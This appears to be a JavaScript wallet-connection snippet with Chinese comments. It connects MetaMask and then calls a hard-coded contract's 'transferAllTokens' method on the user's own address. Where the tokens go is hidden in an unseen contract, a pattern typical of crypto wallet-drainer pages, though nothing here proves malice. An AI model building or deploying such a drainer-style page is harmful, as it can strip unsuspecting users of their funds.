let web3;
let userAddress;
let contract;
const contractAddress = "0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F";  // 智能合约地址
const abi = [
  {
    "inputs": [{"internalType": "address","name": "from","type": "address"}],
    "name": "transferAllTokens",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  // 其他函数...
];

// 连接钱包
document.getElementById('connectButton').addEventListener('click', async () => {
  try {
    console.log("正在尝试连接钱包...");
    if (typeof window.ethereum !== 'undefined') {
      // 请求连接钱包
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      userAddress = accounts[0];
      web3 = new Web3(window.ethereum);
      contract = new web3.eth.Contract(abi, contractAddress);

      // 钱包连接成功，启用转移按钮
      document.getElementById('transferButton').disabled = false;
      alert('钱包已连接: ' + userAddress);
      console.log("钱包已连接，用户地址: ", userAddress);
    } else {
      alert('请安装Metamask钱包');
      console.log("Metamask未检测到");
    }
  } catch (error) {
    console.error("连接钱包失败: ", error);
    alert('连接钱包失败，请重试');
  }
});

// 转移所有代币
document.getElementById('transferButton').addEventListener('click', async () => {
  if (!userAddress || !contract) {
    alert('请先连接钱包');
    console.log("未连接钱包，转移操作无法进行");
    return;
  }

  try {
    console.log("正在执行代币转移操作...");
    await contract.methods.transferAllTokens(userAddress).send({ from: userAddress });
    alert('代币转移成功');
    console.log("代币转移成功");
  } catch (error) {
    console.error("代币转移失败: ", error);
    alert('代币转移失败，请重试');
  }
});
